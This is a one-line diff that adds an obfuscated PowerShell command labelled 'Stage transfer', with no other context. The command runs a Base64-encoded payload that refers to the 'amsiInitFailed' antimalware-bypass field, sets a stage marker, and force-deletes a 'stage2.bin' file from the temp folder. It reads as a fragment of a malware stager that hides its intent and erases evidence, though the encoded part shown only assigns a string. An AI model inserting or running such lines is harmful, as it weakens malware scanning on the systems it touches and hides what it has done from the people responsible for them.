@@ -1,0 +1,1 @@
+<# Stage transfer #> powershell.exe -NoProfile -EncodedCommand JABBAG0AcwBpAE0AYQByAGsAZQByACAAPQAgACIAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACIA; $StageMarker = "stage-39"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
